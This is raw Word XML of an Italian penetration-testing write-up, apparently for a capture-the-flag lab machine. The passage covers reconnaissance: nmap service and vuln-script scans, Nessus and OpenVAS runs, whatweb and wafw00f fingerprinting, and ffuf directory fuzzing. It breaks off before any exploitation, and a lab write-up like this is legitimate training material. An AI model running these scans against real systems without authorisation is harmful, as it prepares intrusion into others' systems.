        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc377975825" w:id="1914590919"/>
      <w:r w:rsidR="00516F0F">
        <w:rPr/>
        <w:t>nmap</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1914590919"/>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="7D9B1D15" w14:textId="45D87F50">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="4CBED57E" w:rsidP="21040C4D" w:rsidRDefault="4CBED57E" w14:paraId="5F34FACA" w14:textId="2DBA41F4">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="4CBED57E">
        <w:drawing>
          <wp:inline wp14:editId="04DCFEC0" wp14:anchorId="46902555">
            <wp:extent cx="5267324" cy="2371725"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="18624997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fabd9572d74c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BED57E">
        <w:rPr/>
        <w:t xml:space="preserve">Risultato </w:t>
      </w:r>
      <w:r w:rsidR="4CBED57E">
        <w:rPr/>
        <w:t>nmap</w:t>
      </w:r>
      <w:r w:rsidR="4CBED57E">
        <w:rPr/>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:r w:rsidR="4CBED57E">
        <w:rPr/>
        <w:t>sC</w:t>
      </w:r>
      <w:r w:rsidR="4CBED57E">
        <w:rPr/>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidR="4CBED57E">
        <w:rPr/>
        <w:t>sV</w:t>
      </w:r>
      <w:r w:rsidR="4CBED57E">
        <w:rPr/>
        <w:t xml:space="preserve"> 10.10.11.12</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="603694FF" w:rsidP="21040C4D" w:rsidRDefault="603694FF" w14:paraId="0B8C2BE1" w14:textId="48848ABB">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="603694FF">
        <w:drawing>
          <wp:inline wp14:editId="66B6CCDE" wp14:anchorId="7DB6FD29">
            <wp:extent cx="4601608" cy="3752850"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1525207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0fbf98eea846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608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03694FF">
        <w:drawing>
          <wp:inline wp14:editId="2FB8015F" wp14:anchorId="17BC9763">
            <wp:extent cx="4636954" cy="4133848"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="13025109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dfa1c652a646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954" cy="413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25420" w:rsidP="21040C4D" w:rsidRDefault="7DA25420" w14:paraId="18D9EA85" w14:textId="72F5925B">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="7DA25420">
        <w:rPr/>
        <w:t xml:space="preserve">Risultato </w:t>
      </w:r>
      <w:r w:rsidR="7DA25420">
        <w:rPr/>
        <w:t>nmap</w:t>
      </w:r>
      <w:r w:rsidR="7DA25420">
        <w:rPr/>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:r w:rsidR="7DA25420">
        <w:rPr/>
        <w:t>sV</w:t>
      </w:r>
      <w:r w:rsidR="7DA25420">
        <w:rPr/>
        <w:t xml:space="preserve"> –script=</w:t>
      </w:r>
      <w:r w:rsidR="7DA25420">
        <w:rPr/>
        <w:t>vuln</w:t>
      </w:r>
      <w:r w:rsidR="7DA25420">
        <w:rPr/>
        <w:t xml:space="preserve"> 10.10.11.12</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7DA25420" w:rsidP="21040C4D" w:rsidRDefault="7DA25420" w14:paraId="3BCE0F15" w14:textId="2215489C">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="7DA25420">
        <w:rPr/>
        <w:t xml:space="preserve">Come possiamo vedere ci sono tante vulnerabilità all’interno dell’asset che però per lo più vanno ad inficiare sulla </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="7DA25420">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r w:rsidR="7DA25420">
        <w:rPr/>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="20D47329">
        <w:rPr/>
        <w:t>Disponibilità</w:t>
      </w:r>
      <w:r w:rsidR="7DA25420">
        <w:rPr/>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r w:rsidR="79643529">
        <w:rPr/>
        <w:t xml:space="preserve">della triade </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="79643529">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve">CIA </w:t>
      </w:r>
      <w:r w:rsidR="79643529">
        <w:rPr/>
        <w:t xml:space="preserve">andando a </w:t>
      </w:r>
      <w:r w:rsidR="1C459188">
        <w:rPr/>
        <w:t>inficiare sulla qualità del servizio</w:t>
      </w:r>
      <w:r w:rsidR="37786146">
        <w:rPr/>
        <w:t xml:space="preserve"> con attacchi di tipo </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="37786146">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>DOS</w:t>
      </w:r>
      <w:r w:rsidR="1C459188">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1C776CDE" w:rsidP="21040C4D" w:rsidRDefault="1C776CDE" w14:paraId="3D95F43E" w14:textId="4D1D2AAB">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1515543624" w:id="839360565"/>
      <w:r w:rsidR="1C776CDE">
        <w:rPr/>
        <w:t>Vulenerability</w:t>
      </w:r>
      <w:r w:rsidR="1C776CDE">
        <w:rPr/>
        <w:t xml:space="preserve"> mapping</w:t>
      </w:r>
      <w:bookmarkEnd w:id="839360565"/>
    </w:p>
    <w:p w:rsidR="43CD5444" w:rsidP="21040C4D" w:rsidRDefault="43CD5444" w14:paraId="29C50C58" w14:textId="0AF066C6">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc928991422" w:id="1212094363"/>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t>Nessus</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1212094363"/>
    </w:p>
    <w:p w:rsidR="43CD5444" w:rsidP="21040C4D" w:rsidRDefault="43CD5444" w14:paraId="4F37E117" w14:textId="5CC8FDF7">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t xml:space="preserve">Andiamo ora ad effettuare il </w:t>
      </w:r>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t xml:space="preserve"> Mapping sia automatico che manuale. Cominciamo con </w:t>
      </w:r>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t>Nessus</w:t>
      </w:r>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="43CD5444" w:rsidP="21040C4D" w:rsidRDefault="43CD5444" w14:paraId="55156005" w14:textId="6CE59D75">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t>Procederemo ad eseguire una scansione dettagliata.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="7FCAD131" w14:textId="204012AF">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="43CD5444" w:rsidP="21040C4D" w:rsidRDefault="43CD5444" w14:paraId="0CA20F92" w14:textId="5994C68B">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="43CD5444">
        <w:drawing>
          <wp:inline wp14:editId="563DF817" wp14:anchorId="5D9EF318">
            <wp:extent cx="5267324" cy="2990867"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2082859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3a71a9b8f148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975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99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040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="684BC50E" w14:textId="78E7FC1F">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="43CD5444" w:rsidP="21040C4D" w:rsidRDefault="43CD5444" w14:paraId="6969A714" w14:textId="10A5D062">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="43CD5444">
        <w:drawing>
          <wp:inline wp14:editId="2166E442" wp14:anchorId="6C20AA1F">
            <wp:extent cx="5267324" cy="3105162"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="7080406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7698b2f75a48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4678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10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CD5444" w:rsidP="21040C4D" w:rsidRDefault="43CD5444" w14:paraId="38A0D078" w14:textId="6900C756">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="43CD5444">
        <w:drawing>
          <wp:inline wp14:editId="0B37A778" wp14:anchorId="53DD6AF3">
            <wp:extent cx="5267324" cy="2495550"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2031690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09e394f36d41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3CD5444">
        <w:rPr/>
        <w:t>Rilevamento vulnerabilità Nessus</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="1337B5F7" w14:textId="0007FC0E">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="43CD5444" w:rsidP="21040C4D" w:rsidRDefault="43CD5444" w14:paraId="0EB78453" w14:textId="536EA02D">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc879902358" w:id="965368460"/>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t>O</w:t>
      </w:r>
      <w:r w:rsidR="4FA42CB8">
        <w:rPr/>
        <w:t>PENVas</w:t>
      </w:r>
      <w:bookmarkEnd w:id="965368460"/>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="60E4F77D" w14:textId="3577B224">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="43CD5444" w:rsidP="21040C4D" w:rsidRDefault="43CD5444" w14:paraId="67119E75" w14:textId="0A108349">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t xml:space="preserve">Analogamente </w:t>
      </w:r>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t xml:space="preserve"> come fatto con </w:t>
      </w:r>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t>Nessus</w:t>
      </w:r>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t xml:space="preserve"> procediamo con </w:t>
      </w:r>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t xml:space="preserve">l’analisi delle vulnerabilità anche con questo altro </w:t>
      </w:r>
      <w:r w:rsidR="43CD5444">
        <w:rPr/>
        <w:t>tool.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1AF6700A" w:rsidP="21040C4D" w:rsidRDefault="1AF6700A" w14:paraId="1DBD374D" w14:textId="184D123A">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="1AF6700A">
        <w:drawing>
          <wp:inline wp14:editId="3EADFBF1" wp14:anchorId="67A6FE10">
            <wp:extent cx="5267324" cy="3143250"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1380528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6363428be040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F6700A" w:rsidP="21040C4D" w:rsidRDefault="1AF6700A" w14:paraId="7223DD74" w14:textId="30DBE4FC">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="1AF6700A">
        <w:drawing>
          <wp:inline wp14:editId="797AF171" wp14:anchorId="75A0E4D1">
            <wp:extent cx="5267324" cy="3114675"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="580994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c0f259121041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F6700A" w:rsidP="21040C4D" w:rsidRDefault="1AF6700A" w14:paraId="2FA90FC8" w14:textId="0EB02C89">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="1AF6700A">
        <w:drawing>
          <wp:inline wp14:editId="0F4B515D" wp14:anchorId="0ED098D0">
            <wp:extent cx="5267324" cy="3086100"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1622496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f545eb6c5140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F6700A" w:rsidP="21040C4D" w:rsidRDefault="1AF6700A" w14:paraId="2330BA86" w14:textId="66AF0C63">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="1AF6700A">
        <w:drawing>
          <wp:inline wp14:editId="44FC395A" wp14:anchorId="720B337A">
            <wp:extent cx="5267324" cy="2352675"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="19351634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3c4f41aae64c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AF6700A">
        <w:rPr/>
        <w:t>Rilevamento vulnerabilità OpenVAS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="054BD4C6" w:rsidP="21040C4D" w:rsidRDefault="054BD4C6" w14:paraId="3B8549E9" w14:textId="2919F72E">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1939481084" w:id="1267633155"/>
      <w:r w:rsidR="054BD4C6">
        <w:rPr/>
        <w:t>Whateb</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1267633155"/>
    </w:p>
    <w:p w:rsidR="3D9D7F5F" w:rsidP="21040C4D" w:rsidRDefault="3D9D7F5F" w14:paraId="16832E2F" w14:textId="47369CFE">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="3D9D7F5F">
        <w:rPr/>
        <w:t xml:space="preserve">Andiamo ora ad analizzare quali framework e tecnologie sono stati utilizzati per creare la </w:t>
      </w:r>
      <w:r w:rsidR="3D9D7F5F">
        <w:rPr/>
        <w:t>WebApp</w:t>
      </w:r>
      <w:r w:rsidR="3D9D7F5F">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="3D9D7F5F" w:rsidP="21040C4D" w:rsidRDefault="3D9D7F5F" w14:paraId="45EE80D0" w14:textId="04BCD68C">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="3D9D7F5F">
        <w:rPr/>
        <w:t xml:space="preserve">Ciò sarà fatto con il comando </w:t>
      </w:r>
      <w:r w:rsidR="3D9D7F5F">
        <w:rPr/>
        <w:t>whatweb</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="3D9D7F5F" w:rsidP="21040C4D" w:rsidRDefault="3D9D7F5F" w14:paraId="726AEBFD" w14:textId="205A782F">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="3D9D7F5F">
        <w:drawing>
          <wp:inline wp14:editId="1DB6B5A3" wp14:anchorId="32ACEDC2">
            <wp:extent cx="5267324" cy="876300"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="12014719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c8e57b0c234c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9D7F5F">
        <w:rPr/>
        <w:t xml:space="preserve">Risultato </w:t>
      </w:r>
      <w:r w:rsidR="3D9D7F5F">
        <w:rPr/>
        <w:t>whatweb</w:t>
      </w:r>
      <w:r w:rsidR="3D9D7F5F">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="Rb42dd3eca7874a5c">
        <w:r w:rsidRPr="21040C4D" w:rsidR="3D9D7F5F">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
          </w:rPr>
          <w:t>http://10.10.11.12:80</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="3D9D7F5F" w:rsidP="21040C4D" w:rsidRDefault="3D9D7F5F" w14:paraId="66BA9444" w14:textId="2A6A0E2F">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="3D9D7F5F">
        <w:rPr/>
        <w:t xml:space="preserve">Con questa semplice scansione possiamo già individuare alcuni servizi e specifiche come il fatto che </w:t>
      </w:r>
      <w:r w:rsidR="6C0ADF91">
        <w:rPr/>
        <w:t>è in esecuzione un servizio in Python.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0183AF5C" w:rsidP="21040C4D" w:rsidRDefault="0183AF5C" w14:paraId="5EC54A1E" w14:textId="3DCF1A1E">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1510582468" w:id="2001794765"/>
      <w:r w:rsidR="0183AF5C">
        <w:rPr/>
        <w:t>WAFW00f</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2001794765"/>
    </w:p>
    <w:p w:rsidR="638D34AA" w:rsidP="21040C4D" w:rsidRDefault="638D34AA" w14:paraId="4FB4FDFA" w14:textId="4DA8B1C7">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="638D34AA">
        <w:rPr/>
        <w:t xml:space="preserve">Ora ci chiediamo se è presente un firewall all’interno della </w:t>
      </w:r>
      <w:r w:rsidR="638D34AA">
        <w:rPr/>
        <w:t>Web App</w:t>
      </w:r>
      <w:r w:rsidR="638D34AA">
        <w:rPr/>
        <w:t xml:space="preserve">. A questo </w:t>
      </w:r>
      <w:r w:rsidR="638D34AA">
        <w:rPr/>
        <w:t>punto</w:t>
      </w:r>
      <w:r w:rsidR="638D34AA">
        <w:rPr/>
        <w:t xml:space="preserve"> possiamo utilizzare wafw00f.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="189D714C" w:rsidP="21040C4D" w:rsidRDefault="189D714C" w14:paraId="06A88D30" w14:textId="6B904D6C">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="189D714C">
        <w:drawing>
          <wp:inline wp14:editId="209ECD42" wp14:anchorId="405770E4">
            <wp:extent cx="4457143" cy="3333333"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="148821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501758215242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9D714C" w:rsidP="21040C4D" w:rsidRDefault="189D714C" w14:paraId="0F6DC41E" w14:textId="7C38AA05">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="189D714C">
        <w:rPr/>
        <w:t xml:space="preserve">Risultato wafw00f </w:t>
      </w:r>
      <w:hyperlink r:id="Rcf66112b7fd440ef">
        <w:r w:rsidRPr="21040C4D" w:rsidR="189D714C">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
          </w:rPr>
          <w:t>http://10.10.11.12:80</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="189D714C" w:rsidP="21040C4D" w:rsidRDefault="189D714C" w14:paraId="0FEDEB7F" w14:textId="3D7935CF">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="189D714C">
        <w:rPr/>
        <w:t xml:space="preserve">In una prima occhiata non risultano essere presenti firewall e ciò può dare più libertà al </w:t>
      </w:r>
      <w:r w:rsidR="189D714C">
        <w:rPr/>
        <w:t>pententeste</w:t>
      </w:r>
      <w:r w:rsidR="189D714C">
        <w:rPr/>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidR="189D714C">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="356030A3" w:rsidP="21040C4D" w:rsidRDefault="356030A3" w14:paraId="7A0BCB1D" w14:textId="42A74980">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc2133826468" w:id="1356800433"/>
      <w:r w:rsidR="356030A3">
        <w:rPr/>
        <w:t>ffuf</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1356800433"/>
    </w:p>
    <w:p w:rsidR="45C238E5" w:rsidP="21040C4D" w:rsidRDefault="45C238E5" w14:paraId="0892D381" w14:textId="7C259D58">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="45C238E5">
        <w:rPr/>
        <w:t>Analizziamo ora tutt</w:t>
      </w:r>
      <w:r w:rsidR="4E256000">
        <w:rPr/>
        <w:t xml:space="preserve">e le pagine presenti all’interno del sito tramite il comando </w:t>
      </w:r>
      <w:r w:rsidR="4E256000">
        <w:rPr/>
        <w:t>ffuf</w:t>
      </w:r>
      <w:r w:rsidR="4E256000">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="4E256000" w:rsidP="21040C4D" w:rsidRDefault="4E256000" w14:paraId="3ACD3822" w14:textId="17E26369">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="4E256000">
        <w:rPr/>
        <w:t xml:space="preserve">Per fare ciò però prima dovremo ottenere delle </w:t>
      </w:r>
      <w:r w:rsidR="4E256000">
        <w:rPr/>
        <w:t>wordlist</w:t>
      </w:r>
      <w:r w:rsidR="4E256000">
        <w:rPr/>
        <w:t xml:space="preserve"> o una concatenazione di esse.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="7F470528">
        <w:rPr/>
        <w:t xml:space="preserve">La </w:t>
      </w:r>
      <w:r w:rsidR="7F470528">
        <w:rPr/>
        <w:t>Wordlist</w:t>
      </w:r>
      <w:r w:rsidR="7F470528">
        <w:rPr/>
        <w:t xml:space="preserve"> che ho utilizzato si trova presso il sito: </w:t>
      </w:r>
      <w:hyperlink r:id="R0d30e4340fee4db3">
        <w:r w:rsidRPr="21040C4D" w:rsidR="7F470528">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
          </w:rPr>
          <w:t>https://wordlists.assetnote.io/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="79728DE5" w:rsidP="21040C4D" w:rsidRDefault="79728DE5" w14:paraId="45BD6254" w14:textId="36183AD4">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="79728DE5">
        <w:drawing>
          <wp:inline wp14:editId="32615F02" wp14:anchorId="6E87575D">
            <wp:extent cx="5267324" cy="4000500"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1946366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30252b82c046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728DE5">
        <w:rPr/>
        <w:t xml:space="preserve">Risultato </w:t>
      </w:r>
      <w:r w:rsidR="79728DE5">
        <w:rPr/>
        <w:t>ffuf</w:t>
      </w:r>
      <w:r w:rsidR="79728DE5">
        <w:rPr/>
        <w:t xml:space="preserve"> –c –w ~/path/to/</w:t>
      </w:r>
      <w:r w:rsidR="79728DE5">
        <w:rPr/>
        <w:t>wordlist</w:t>
      </w:r>
      <w:r w:rsidR="79728DE5">
        <w:rPr/>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidR="79728DE5">
        <w:rPr/>
        <w:t>u ”</w:t>
      </w:r>
      <w:r w:rsidR="79728DE5">
        <w:rPr/>
        <w:t>http://</w:t>
      </w:r>
      <w:r w:rsidR="79728DE5">
        <w:rPr/>
        <w:t>capiclean.htb</w:t>
      </w:r>
      <w:r w:rsidR="79728DE5">
        <w:rPr/>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="3465245A">
        <w:rPr/>
        <w:t>FUZZ</w:t>
      </w:r>
      <w:r w:rsidR="79728DE5">
        <w:rPr/>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> -t 400</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7097324E" w:rsidP="21040C4D" w:rsidRDefault="7097324E" w14:paraId="5AFFC177" w14:textId="158687C6">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve">E </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>già</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> da qui </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>possiamo</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>trovare</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>delle</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>pagine</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>interessanti</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>che</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>saranno</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>necessarie</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> al </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>completamento</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>della</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>sfida</w:t>
      </w:r>
      <w:r w:rsidR="7097324E">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="35BFEF97" w:rsidP="21040C4D" w:rsidRDefault="35BFEF97" w14:paraId="2F51CCF6" w14:textId="465E657E">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc62393433" w:id="1084176936"/>
      <w:r w:rsidR="35BFEF97">
        <w:rPr/>
        <w:t xml:space="preserve">Analisi </w:t>
      </w:r>
      <w:r w:rsidR="35BFEF97">
        <w:rPr/>
        <w:t>manuale</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1084176936"/>
    </w:p>
    <w:p w:rsidR="35BFEF97" w:rsidP="21040C4D" w:rsidRDefault="35BFEF97" w14:paraId="57D8A297" w14:textId="5BB4E1D0">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="35BFEF97">
        <w:rPr/>
        <w:t>Ci rechiamo in primis sul sito per vedere la sua struttura e le sue caratteristiche e se sono presenti dei campi di input che possono essere sfruttati</w:t>
